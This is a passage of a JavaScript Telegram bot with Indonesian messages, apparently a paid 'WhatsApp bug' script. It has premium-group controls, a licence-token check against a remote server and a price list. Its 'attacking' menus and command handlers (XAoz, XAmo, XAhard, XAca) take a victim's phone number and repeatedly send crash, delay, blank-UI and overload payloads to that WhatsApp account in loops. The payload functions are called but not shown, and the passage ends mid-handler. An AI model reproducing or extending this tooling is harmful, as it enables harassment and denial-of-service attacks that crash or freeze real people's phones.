    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgcpremium -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

const pendingVerification = new Set();
// ================
// 🔐 VERIFIKASI TOKEN
// ================
bot.use(async (ctx, next) => {
  if (secureMode) return next();
  if (tokenValidated) return next();

  const chatId = (ctx.chat && ctx.chat.id) || (ctx.from && ctx.from.id);
  if (!chatId) return next();
  if (pendingVerification.has(chatId)) return next();
  pendingVerification.add(chatId);

  const sleep = (ms) => new Promise((res) => setTimeout(res, ms));

  const totalSteps = 20; // jumlah frame progress
  const spinnerFrames = ["😐","😛","😐","😛","😐","😛","😐","😛","😐","😛"]; // animasi spinner

  function generateProgressBar(step, total) {
    const filled = "▰".repeat(step);
    const empty = "▱".repeat(total - step);
    const percent = Math.round((step / total) * 100);
    return `${filled}${empty} ${percent}%`;
  }

  let loadingMsg = null;

  try {
    loadingMsg = await ctx.reply("❗ERROR❗", {
      parse_mode: "Markdown"
    });

    // cinematic loading
    for (let i = 1; i <= totalSteps; i++) {
      if (tokenValidated) break;

      const frame = generateProgressBar(i, totalSteps);
      const spinner = spinnerFrames[i % spinnerFrames.length];

      await sleep(120 + Math.random() * 50);

      try {
        await ctx.telegram.editMessageText(
          loadingMsg.chat.id,
          loadingMsg.message_id,
          null,
          `𝐁𝐄𝐑𝐂𝐀𝐍𝐃𝐀 𝐁𝐈𝐒𝐀 𝐍𝐈𝐇\n${frame} ${spinner}\n𝐒𝐀𝐁𝐀𝐑 𝐘𝐀....`,
          { parse_mode: "Markdown" }
        );
      } catch { /* skip */ }
    }

    // cek konfigurasi server
    if (!databaseUrl || !tokenBot) {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "⚠️ *Konfigurasi server tidak lengkap.*\nPeriksa `databaseUrl` atau `tokenBot`.",
        { parse_mode: "Markdown" }
      );
      pendingVerification.delete(chatId);
      return;
    }

    // ambil data token dari server
    const getTokenData = () => new Promise((resolve, reject) => {
      https.get(databaseUrl, { timeout: 6000 }, (res) => {
        let data = "";
        res.on("data", chunk => data += chunk);
        res.on("end", () => {
          try {
            resolve(JSON.parse(data));
          } catch {
            reject(new Error("Invalid JSON response"));
          }
        });
      }).on("error", reject);
    });

    let result;
    try {
      result = await getTokenData();
    } catch {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "⚠️ *Gagal mengambil daftar token dari server.*\nSilakan coba lagi nanti.",
        { parse_mode: "Markdown" }
      );
      pendingVerification.delete(chatId);
      return;
    }

    const tokens = Array.isArray(result?.tokens) ? result.tokens : [];
    if (tokens.length === 0) {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "⚠️ *Token tidak tersedia di database.*\nHubungi admin untuk memperbarui data.",
        { parse_mode: "Markdown" }
      );
      pendingVerification.delete(chatId);
      return;
    }

    // validasi token
    if (tokens.includes(tokenBot)) {
      tokenValidated = true;
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "ERROR❗ERRROR❗ERROR❗",
        { parse_mode: "Markdown" }
      );
      await sleep(1000);
      pendingVerification.delete(chatId);
      return next();
    } else {
      const keyboardBypass = {
        inline_keyboard: [
          [{ text: "Buy Script", url: "https://t.me/celienta", style: "success" }]
        ]
      };

      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "*Bypass Detected!*\nToken tidak sah atau tidak terdaftar.\nYour access has been restricted.",
        { parse_mode: "Markdown" }
      );

      await sleep(500);
      await ctx.replyWithPhoto("https://freeimage.host/i/BgkkOSR", {
        caption:
          "🚫 *Access Denied*\nSistem mendeteksi token tidak valid.\nGunakan versi original dari owner.",
        parse_mode: "Markdown",
        reply_markup: keyboardBypass
      });

      pendingVerification.delete(chatId);
      return;
    }

  } catch (err) {
    console.error("Verification Error:", err);
    if (loadingMsg) {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "⚠️ *Terjadi kesalahan saat memverifikasi token.*",
        { parse_mode: "Markdown" }
      );
    } else {
      await ctx.reply("⚠️ *Terjadi kesalahan saat memverifikasi token.*", {
        parse_mode: "Markdown"
      });
    }
  } finally {
    pendingVerification.delete(chatId);
  }
});

bot.start(async (ctx) => {
  try {
    if (!tokenValidated)
      return ctx.reply("❌ *Token belum diverifikasi server.* Tunggu proses selesai.", { parse_mode: "HTML" });

    const userId = ctx.from.id;
    const isOwner = userId == ownerID;
    const premiumStatus = isPremiumUser(userId) ? "Premium User" : "No Access";
    const senderStatus = isWhatsAppConnected ? "Sender On" : "Sender Off";

    if (!isOwner) {
      if (ctx.chat.type === "private") {
        ctx.telegram.sendMessage(ownerID, `📩 *NOTIFIKASI START PRIVATE*\n👤 User: ${ctx.from.first_name}\n🆔 ID: <code>${userId}</code>`, { parse_mode: "HTML" }).catch(() => {});
        return ctx.reply("❌ Bot ini hanya bisa digunakan di grup yang memiliki akses.");
      }
      if (!isPremGroup(ctx.chat.id)) {
        return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
      }
    }

    const menuMessage = `
✨WELCOME IN ANGELES Y DIABLOS ✨
<blockquote><pre>⬡═―—⊱ ⎧ ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ ⎭ ⊰―—═⬡</pre></blockquote>
⫹⫺ Developer: @celienta
⫹⫺ Version: 10 Private Svip
⫹⫺ Prefix: / ( slash )
<blockquote><pre>⬡═―—⊱ ⎧ sᴛᴀᴛᴜs ᴜsᴇʀ ⎭ ⊰―—═⬡</pre></blockquote>
⫹⫺ Username : @${ctx.from.username || "Tidak Ada"}
⫹⫺ User Id   : ${userId}
⫹⫺ Sender    : ${senderStatus}  
⫹⫺ Status    : ${premiumStatus}
<blockquote>sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ʙᴜᴛᴛᴏɴ</blockquote>`;

const keyboard = [
        [
          {
           text: "ᴀᴜᴛʜᴏʀ",
           url: "https://t.me/celienta",
           style: "primary",
          },
          {
           text: "ᴄʜᴀɴɴᴇʟ",
           url: "https://t.me/Taxallmpr",
           style: "success",
          },
        ],
        [
          {
          text: "ᴘʀɪᴄᴇ sᴄ",
          callback_data: "/sc",
          style: "primary",
          },
          {
           text: "ᴛᴏᴏʟs ᴍᴇɴᴜ",
           callback_data: "tols",
           style: "success",
          },
        ],
        [
          {
           text: "ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
           callback_data: "/grup",
           style: "primary",
          },
          {
           text: "ᴛǫ ᴍᴇɴᴜ",
           callback_data: "/tqto",
           style: "success",
          },
        ], 
        [
          {
           text: "ᴄᴏɴᴛʀᴏʟ ᴍᴇɴᴜ",
           callback_data: "/controls",
           style: "primary",
          },
          {
          text: "ᴀᴛᴛᴀᴄᴋɪɴɢ",
          callback_data: "/bug",
          style: "success",
          },
        ], 
        [
           {
            text: "ɪɴғᴏ ᴜᴘᴅᴀᴛᴇ",
            callback_data: "/update",
            style: "danger",
            },
        ]
    ];

    ctx.replyWithAudio(
      { source: "./database/Angel.mp3" }, 
      { caption: "ÁNGELES Y DIABLOS" }
    ).catch(e => console.error("Gagal kirim audio:", e.message));

    await new Promise(resolve => setTimeout(resolve, 1000));

    await ctx.replyWithPhoto(thumbnailPhoto, {
      caption: menuMessage,
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: keyboard }
    });

  } catch (error) {
    console.error("Error pada Command Start:", error);
  }
});

// ======================
// CALLBACK UNTUK MENU UTAMA
// ======================
bot.action("/start", async (ctx) => {
  if (!tokenValidated)
    return ctx.answerCbQuery("🔑 Token belum diverifikasi server.");

  const userId = ctx.from.id;
  const premiumStatus = isPremiumUser(ctx.from.id) ? "Premium User" : "No Acces";
  const senderStatus = isWhatsAppConnected ? "Sender On" : "Sender Off";
  const runtimeStatus = formatRuntime();

  const menuMessage = `
✨ANGELES Y DIABLOS ✨
<blockquote><pre>⬡═―—⊱ ⎧ ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ ⎭ ⊰―—═⬡</pre></blockquote>
⫹⫺ Developer: @celienta
⫹⫺ Version: 10 Private Svip
⫹⫺ Prefix: / ( slash )
⫹⫺ Language: JavaScript
<blockquote><pre>⬡═―—⊱ ⎧ sᴛᴀᴛᴜs ᴜsᴇʀ ⎭ ⊰―—═⬡</pre></blockquote>
⫹⫺ Username : @${ctx.from.username || "Tidak Ada"}
⫹⫺ User Id   : ${userId}
⫹⫺ Sende    : ${senderStatus}  
⫹⫺ Status    : ${premiumStatus}
⫹⫺ Runtime  : ${runtimeStatus}
<blockquote>sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ʙᴜᴛᴛᴏɴ</blockquote>`;

  const keyboard = [
        [
          {
           text: "ᴀᴜᴛʜᴏʀ",
           url: "https://t.me/celienta",
           style: "primary",
          },
          {
           text: "ᴄʜᴀɴɴᴇʟ",
           url: "https://t.me/Taxallmprr",
           style: "success",
          },
        ],
        [
          {
          text: "ᴘʀɪᴄᴇ sᴄ",
          callback_data: "/sc",
          style: "primary",
          },
          {
           text: "ᴛᴏᴏʟs ᴍᴇɴᴜ",
           callback_data: "tols",
           style: "success",
          },
        ],
        [
          {
           text: "ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
           callback_data: "/grup",
           style: "primary",
          },
          {
           text: "ᴛǫ ᴍᴇɴᴜ",
           callback_data: "/tqto",
           style: "success",
          },
        ], 
        [
          {
           text: "ᴄᴏɴᴛʀᴏʟ ᴍᴇɴᴜ",
           callback_data: "/controls",
           style: "primary",
          },
          {
          text: "ᴀᴛᴛᴀᴄᴋɪɴɢ",
          callback_data: "/bug",
          style: "success",
          },
        ], 
        [
           {
            text: "ɪɴғᴏ ᴜᴘᴅᴀᴛᴇ",
            callback_data: "/update",
            style: "danger",
            },
        ]
    ];

  try {
    await ctx.editMessageMedia({
        type: 'photo',
        media: thumbnailPhoto,
        caption: menuMessage,
        parse_mode: "HTML",
    }, {
        reply_markup: { inline_keyboard: keyboard }
    });

    await ctx.answerCbQuery();

  } catch (error) {
    if (
        error.response &&
        error.response.error_code === 400 &&
        error.response.description.includes("メッセージは変更されませんでした")
    ) {
        await ctx.answerCbQuery();
    } else {
        console.error("Error saat mengirim menu:", error);
        await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
    }
  }
});

bot.action('tols', async (ctx) => {
    const controlsMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ ᴛᴏᴏʟs ᴍᴇɴᴜ ⎭ ⊰―—═⬡</pre></blockquote>
⫹⫺ /image - Searching photos  the internet 
⫹⫺ /ai - Perplexity ai
⫹⫺ /spotify - Play Music Spotify
⫹⫺ /spplay - Play Music Spp
⫹⫺ /playmusic - Play Music
⫹⫺ /nanobanana - photo according to prompt
⫹⫺ /testfunct - Testing Function Bug
<blockquote>sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ʙᴜᴛᴛᴏɴ</blockquote>
`;

    const keyboard = [
        [
            { text: "ʙᴀᴄᴋ", callback_data: "/start", style: "primary" },
            { text: "ᴄʜᴀɴɴᴇʟ", url: "https://t.me/Taxallmpr", style: "success" }
        ], 
        [
            { text: "ᴛᴏᴏʟs ᴠ𝟸", callback_data: "tols2", style: "danger" }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di controls menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('tols2', async (ctx) => {
    const controlsMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ ᴛᴏᴏʟs ᴠ𝟸 ⎭ ⊰―—═⬡</pre></blockquote>
⫹⫺ /tiktok -  Tiktok Donwloader
⫹⫺ /bratbahlil - Text To Stiker Photo Bahlil
⫹⫺ /snackvid - Snack Video Donwloader
⫹⫺ /tourl - Photo To Url
⫹⫺ /ultrabola - Sepak Bola Pinalty
⫹⫺ /coin - Cek Coin
⫹⫺ /duel - Play War
⫹⫺ /hd - Hd Foto
<blockquote>sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ʙᴜᴛᴛᴏɴ</blockquote>
`;

    const keyboard = [
        [
            { text: "ʙᴀᴄᴋ", callback_data: "/start", style: "primary" },
            { text: "ᴄʜᴀɴɴᴇʟ", url: "https://t.me/Taxallmpr", style: "success" }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di controls menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/update', async (ctx) => {
    const controlsMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ ɪɴғᴏ ᴜᴘᴅᴀᴛᴇ ⎭ ⊰―—═⬡</pre></blockquote>
⫹⫺ Developer : @celienta
⫹⫺ Bailsy : Module
⫹⫺ up script : Infinity
<blockquote>INFORMASI</blockquote>
<blockquote>TUNGGU SAMPAI ADA PEMBERITAHUAN UPDATE DI GROUP.</blockquote>
`;

    const keyboard = [
        [
            { text: "ʙᴀᴄᴋ", callback_data: "/start", style: "primary" },
            { text: "ᴄʜᴀɴɴᴇʟ", url: "https://t.me/Taxallmpr", style: "success" }
        ], 
        [
            { text: "ᴀᴜᴛʜᴏʀ", url: "https://t.me/celienta", style: "danger" }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di controls menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/sc', async (ctx) => {
    const controlsMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ ʜᴀʀɢᴀ sᴄʀɪᴘᴛ ⎭ ⊰―—═⬡</pre></blockquote>
⚜️ 𝚑𝚊𝚛𝚐𝚊 𝙰𝚗𝚐𝚎𝚕𝚎𝚜 𝚢 𝙳𝚒𝚊𝚋𝚕𝚘𝚜 ⚜️
-𝚗𝚘 𝚞𝚙 : 3𝚔
-𝚏𝚞𝚕 𝚞𝚙 : 5𝚔
-𝚛𝚎𝚜𝚜 : 7𝚔
-𝚘𝚠𝚗𝚎𝚛 : 10𝚔
-𝚟𝚒𝚙 : 15𝚔
-𝚜𝚟𝚒𝚙 : 25𝚔
<blockquote>sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ʙᴜᴛᴛᴏɴ</blockquote>
`;

    const keyboard = [
        [
            { text: "ʙᴀᴄᴋ", callback_data: "/start", style: "primary" },
            { text: "ᴄʜᴀɴɴᴇʟ", url: "https://t.me/Taxallmpr", style: "success" }
        ], 
        [
            { text: "ᴀᴜᴛʜᴏʀ", url: "https://t.me/celienta", style: "danger" }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di controls menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/grup', async (ctx) => {
    const controlsMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ ᴍᴇɴᴜ ɢʀᴏᴜᴘ ⎭ ⊰―—═⬡</pre></blockquote>
⫹⫺ /tagall - Tag members who often chime in 
⫹⫺ /getlink - Get Link Group
⫹⫺ /ceklink - Check Active Group Link 
⫹⫺ /ban - Banned User From Group
⫹⫺ /kick - Kick User From Group
⫹⫺ /mute - Mute User Group
<blockquote>sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ʙᴜᴛᴛᴏɴ</blockquote>
`;

    const keyboard = [
        [
            { text: "ʙᴀᴄᴋ", callback_data: "/start", style: "primary" },
            { text: "ᴄʜᴀɴɴᴇʟ", url: "https://t.me/Taxallmpr", style: "success" }
        ], 
        [
            { text: "ɢʀᴏᴜᴘ ᴠ𝟸", callback_data: "/grup2", style: "danger" }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di controls menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/grup2', async (ctx) => {
    const controlsMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ ᴍᴇɴᴜ ɢʀᴏᴜᴘ ᴠ𝟸 ⎭ ⊰―—═⬡</pre></blockquote>
⫹⫺ /unmute - Unmute User Group
⫹⫺ /antidoc [ on|off ] - Deleted Document
⫹⫺ /antidoc [ status ] - Chek Document
⫹⫺ /promoteesy - Promote User Esy
⫹⫺ /promotemedium - Promote Medium
⫹⫺ /promotehard - Promote Hard
⫹⫺ /demote - Demote User
<blockquote>sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ʙᴜᴛᴛᴏɴ</blockquote>
`;

    const keyboard = [
        [
            { text: "ʙᴀᴄᴋ", callback_data: "/start", style: "primary" },
            { text: "ᴄʜᴀɴɴᴇʟ", url: "https://t.me/Taxallmpr", style: "success" }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di controls menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/controls', async (ctx) => {
    const controlsMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ ᴄᴏɴᴛʀᴏʟ ᴍᴇɴᴜ ⎭ ⊰―—═⬡</pre></blockquote>
⫹⫺ /addprem - Input ID  
⫹⫺ /delprem - Input ID  
⫹⫺ /addpremgrup - AddPrem Grup
⫹⫺ /delpremgruo - Deleted Premium Grup
⫹⫺ /setcd - Set Coldown
⫹⫺ /connect - 62xx  
<blockquote>sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ʙᴜᴛᴛᴏɴ</blockquote>
`;

    const keyboard = [
        [
            { text: "ʙᴀᴄᴋ", callback_data: "/start", style: "primary" },
            { text: "ᴄʜᴀɴᴇʟʟ", url: "https://t.me/Taxallmpr", style: "success" }
        ], 
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di controls menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/bug', async (ctx) => {
    const bugMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ ɴᴏ ɪɴᴠɪsɪʙʟᴇ ᴀᴛᴛᴀᴄᴋ ⎭ ⊰―—═⬡</pre></blockquote>
⚊▣ /XApy × ForcloseDelete
⚊▣ /XAvi × OnlyIos
⚊▣ /XAta × CrashHard
⚊▣ /XAoz × DelayHard
⚊▣ /XAca × BlankHard
⚊▣ /XAza × CrashUi  
⚊▣ /XAhard × ComboBug
<blockquote>sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ʙᴜᴛᴛᴏɴ</blockquote>`;

    const keyboard = [
        [
            { text: "ʙᴀᴄᴋ", callback_data: "/start", style: "primary" },
            { text: "ᴄʜᴀɴɴᴇʟ", url: "https://t.me/Taxallmpr", style: "success" }
        ],
        [
           { text: "ʙᴜɢ ɪɴᴠɪsɪʙʟᴇ", callback_data: "/invisible", style: "danger" }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di bug menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/invisible', async (ctx) => {
    const bugMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ ɪɴᴠɪsɪʙʟᴇ ᴀᴛᴛᴀᴄᴋ ⎭ ⊰―—═⬡</pre></blockquote>
⚊▣ /XAmo - CrashInvisible
⚊▣ /XAmz - ForcloseInvis
⚊▣ /XAwe - DelayInvis
⚊▣ /XAci - CanSpam
⚊▣ /XAcu - CanSpam
<blockquote>sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ʙᴜᴛᴛᴏɴ</blockquote>`;

    const keyboard = [
        [
            { text: "ʙᴀᴄᴋ", callback_data: "/start", style: "primary" },
            { text: "ᴄʜᴀɴɴᴇʟ", url: "https://t.me/Taxallmpr", style: "success" }
        ], 
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di bug menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/tqto', async (ctx) => {
    const tqtoMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ ᴛʜᴀɴᴋs ᴛᴏ ⎭ ⊰―—═⬡</pre></blockquote>
⫹⫺ Allah - ᴍʏ ɢᴏᴅ
⫹⫺ celienta - ᴀᴜᴛʜᴏʀ
⫹⫺ All buyer Angeles 
<blockquote>ᴛǫᴛᴏ ᴀɴɢᴇʟᴇs ʏ ᴅɪᴀʙʟᴏs</blockquote>`;

    const keyboard = [
        [
            { text: "ʙᴀᴄᴋ", callback_data: "/start", style: "primary" },
            { text: "ᴄʜᴀɴɴᴇʟ", url: "https://t.me/Taxallmpr", style: "success" }
        ], 
    ];

    try {
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di tqto menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.command("XAoz", checkWhatsAppConnection,checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /XAoz 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  

if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
}
  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⟡━⟢ ÁNGELES Y DIABLOS ⟣━⟡
⌑ Target: ${q}
⌑ Type: Delay Hard
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "danger" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 25; i++) {
    await delaycrot(sock, target);
    await delayhard(sock, target);
    await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⟡━⟢ ÁNGELES Y DIABLOS ⟣━⟡
⌑ Target: ${q}
⌑ Type: Delay Hard 
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "danger" }
      ]]
    }
  });
});

bot.command("XAmo", checkWhatsAppConnection,checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /XAmo 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  

if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
}
  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⟡━⟢ ÁNGELES Y DIABLOS ⟣━⟡
⌑ Target: ${q}
⌑ Type: CrashInvis
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "danger" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 25; i++) {
    await crashinvis(target, sock);
    await crashinvis(target, sock);
    await sleep(2500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⟡━⟢ ÁNGELES Y DIABLOS ⟣━⟡
⌑ Target: ${q}
⌑ Type: CrashInvis
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "danger" }
      ]]
    }
  });
});

bot.command("XAhard", checkWhatsAppConnection, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /XAhard 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⟡━⟢ ÁNGELES Y DIABLOS ⟣━⟡
⌑ Target: ${q}
⌑ Type: Combo Bug
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "danger" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 15; i++) {
    await SennUiOverload(sock, target);
    await Blankuiii(sock, target);
    await delaycrot(sock, target);
    await sleep(2500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⟡━⟢ ÁNGELES Y DIABLOS ⟣━⟡
⌑ Target: ${q}
⌑ Type: Comob Bug
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "danger" }
      ]]
    }
  });
});

bot.command("XAca", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /XAca 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⟡━⟢ ÁNGELES Y DIABLOS ⟣━⟡
⌑ Target: ${q}
⌑ Type: Blank Hard
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "danger" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 20; i++) {
    await Blankuiii(sock, target);
    await sleep(1500);
    }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⟡━⟢ ÁNGELES Y DIABLOS ⟣━⟡
⌑ Target: ${q}
⌑ Type: Blank Hard
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "danger" }
